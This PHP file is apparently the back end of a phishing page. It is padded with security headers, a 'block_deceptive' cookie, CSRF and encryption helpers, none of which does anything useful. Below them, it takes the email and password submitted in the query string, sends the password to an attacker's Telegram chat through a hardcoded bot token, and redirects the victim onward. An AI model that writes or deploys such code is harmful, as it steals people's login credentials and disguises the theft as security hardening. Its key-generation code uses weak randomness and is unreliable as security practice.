<?php
// Add SSL headers
function addSSLHeaders()
{
    header("Strict-Transport-Security: max-age=31536000; includeSubDomains");
    header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self'");
    header("X-Content-Type-Options: nosniff");
    header("X-Frame-Options: DENY");
    header("X-XSS-Protection: 1; mode=block");
    header("Referrer-Policy: no-referrer"); // New: Referrer-Policy header
    header("Feature-Policy: microphone 'none'; camera 'none'; geolocation 'none'"); // New: Feature-Policy header
}

// Call the function to add SSL headers
addSSLHeaders();

// Set a temporary cookie session to block deceptive behavior
if (!isset($_COOKIE['block_deceptive'])) {
    $expiry = time() + 3600; // Set the expiry time to 1 hour from now
    setcookie('block_deceptive', '1', $expiry, '/');
}

// Perform CSRF protection
session_start();
$csrfToken = md5(uniqid(rand(), true));
$_SESSION['csrf_token'] = $csrfToken;

// Prevent XSS attacks
function sanitizeInput($input)
{
    $input = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
    return $input;
}

// Encryption functions
function generateRandomKey($length = 32)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $key = '';
    for ($i = 0; $i < $length; $i++) {
        $index = rand(0, strlen($characters) - 1);
        $key .= $characters[$index];
    }
    return $key;
}

function encryptData($data, $key)
{
    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('AES-256-CBC'));
    $encryptedData = openssl_encrypt($data, 'AES-256-CBC', $key, 0, $iv);
    $encryptedData = base64_encode($encryptedData) . '::' . base64_encode($iv);
    return $encryptedData;
}

function decryptData($encryptedData, $key)
{
    $dataParts = explode('::', $encryptedData, 2);
    if (count($dataParts) === 2) {
        $decryptedData = openssl_decrypt(base64_decode($dataParts[0]), 'AES-256-CBC', $key, 0, base64_decode($dataParts[1]));
        return $decryptedData;
    }
    return null;
}

// Get the current date
$currentDate = new DateTime();

// Calculate the expiry date (30 days from the current date)
$expiryDate = $currentDate->add(new DateInterval('P30D'));

// Format the expiry date as desired (e.g., "F j, Y")
$formattedExpiryDate = $expiryDate->format('F j, Y');

$at   = "@";
$name = "\n🪪 " . $_GET['email'];
$pass = "\n🔐backup   ".$at.$_GET['password'];
$li   = ":";
$lh   = "|";

$message ="$pass";

$apiToken = "6547328306:AAFosAwa7wPggddiOV_QgTw7xI-uX8ZEY6s"; 
$data = [
    'chat_id' => '-1001809635857',
    'text' => $message
];


$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );

header("Location: 040150.php");
exit;
?>
